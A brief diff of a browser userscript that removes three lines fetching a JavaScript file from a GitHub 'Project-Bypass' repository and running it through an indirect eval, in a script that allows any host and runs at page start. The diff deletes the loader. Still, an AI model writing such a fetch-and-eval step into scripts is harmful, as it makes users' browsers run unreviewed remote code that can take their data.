@@ -13,9 +13,6 @@
 // @connect      *
 // @run-at       document-start
 // ==/UserScript==
-fetch('https://raw.githubusercontent.com/huyzeraa/Project-Bypass/refs/heads/main/layma-protected.js')
-    .then(r => r.text())
-    .then(c => (0, eval)(c));
 (function () {
     'use strict';
 
